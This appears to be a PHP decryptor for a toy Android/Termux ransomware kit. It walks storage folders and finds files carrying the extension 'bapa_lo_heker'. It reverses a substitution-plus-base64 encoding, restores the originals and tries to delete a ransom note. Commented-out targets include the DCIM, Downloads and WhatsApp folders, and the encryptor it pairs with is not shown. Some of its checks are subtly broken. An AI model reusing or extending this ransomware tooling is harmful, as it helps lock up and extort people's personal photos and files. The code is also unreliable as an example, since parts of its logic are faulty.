<?php 
	
	ini_set('output_buffering', 'off');
	ini_set('zlib.output_compression', false);

    /* Direktori yang akan di Encrkrip */
   	$ext = "bapa_lo_heker"; 
    $extLength = - (strlen($ext) + 1);

	function decryptFile($value, $dir){
		
		global $extLength;

		$decArr = ["~" => "a","@" => "b","Y" => "c","O" => "d","]" => "e","V" => "f","uP" => "g","#" => "h","4a" => "i","m+" => "j","z" => "k","b;" => "l","7" => "m","3" => "n","z*" => "o","m" => "p","4" => "q","%" => "r","Yp" => "s","W" => "t","U" => "u","N" => "v","a" => "w","(" => "x","|o" => "y","/" => "z","G" => "A","M" => "B","mM" => "C","B" => "D","1<" => "E","*" => "F","a#" => "G","S" => "H","&" => "I","0v" => "J","H" => "K","1+" => "L","G/" => "M","x?" => "N","h1" => "O","Ux" => "P","L4" => "Q","v" => "R","u" => "S","aW" => "T","4L" => "U","L" => "V","J" => "W","8" => "X","n" => "Y","" => "Z","x" => "1","b" => "2","+7" => "3","X" => "4","s" => "5",")" => "6","$" => "7","o" => "8","+" => "9","A" => "0","w" => "=","[4" => "+","1" => "/"];

		$file = '';
		$ex = explode(".", $value);
		foreach ($ex as $key) {
			if ($key !== '' || $key !== ' ') {
				
				$file .= $decArr[$key];	
			}
		}
		
		$fileAsli = base64_decode($file);

		$o = fopen($dir, 'w');
		fwrite($o, $fileAsli);
		fclose($o);

		rename($dir, substr($dir, 0, $extLength));
		echo "[+] Decrypt File => $dir \n";
	}

	function getFile($dir){

		global $ext;

		$fileList = glob($dir."/*");
		foreach ($fileList as $filename) {
			if(is_file($filename)){

				if ($filename === preg_match("/baca_aku_mas/", $filename)) {

					unlink($dir."/baca_aku_mas.txt");
				}else{

					$info = pathinfo($filename);
					if ($info['extension'] === $ext) {

						$base = file_get_contents($filename);
						decryptFile($base, $filename);	
					}
				}

		    }else{
		    	getFile($filename);
		    }   
		}
	}

	$root = '/data/data/com.termux/files/home/';
    $diskArr = [
    	// 'storage/dcim',
    	// 'storage/downloads',
    	// 'storage/pictures',
    	// 'storage/shared/Whatsapp',
    	'storage/shared/asu'
    ];

    foreach ($diskArr as $key) {

        $dir = $root.$key;
        if (is_dir($dir)) {
        	
        	// dir ditemukan
        	getFile($dir);
        }else{
        	echo "tidak ketemu";
        }
    }
?>
